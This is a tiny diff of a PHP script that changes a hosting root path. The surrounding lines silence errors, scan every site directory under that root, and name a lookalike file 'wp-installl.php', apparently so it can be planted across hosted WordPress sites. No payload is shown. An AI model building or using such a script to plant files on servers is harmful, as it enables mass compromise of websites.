@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 
-$root = '/var/www/vhosts';
+$root = '/var/www/sites';
 $scan = scandir($root);
 
 $nama = 'wp-installl.php'; // ganti nama file
